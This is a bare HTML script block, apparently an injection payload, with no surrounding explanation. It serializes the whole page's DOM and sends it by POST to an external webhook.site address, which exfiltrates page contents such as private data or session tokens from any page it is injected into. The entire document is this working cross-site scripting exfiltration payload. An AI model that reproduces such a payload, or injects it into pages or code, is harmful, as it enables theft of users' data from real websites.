<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://webhook.site/b0062056-f338-4b5a-a2fb-044aa09f1644", true);
var text = new XMLSerializer().serializeToString(document);
xhr.send(JSON.stringify({
    "a": text
}));
</script>
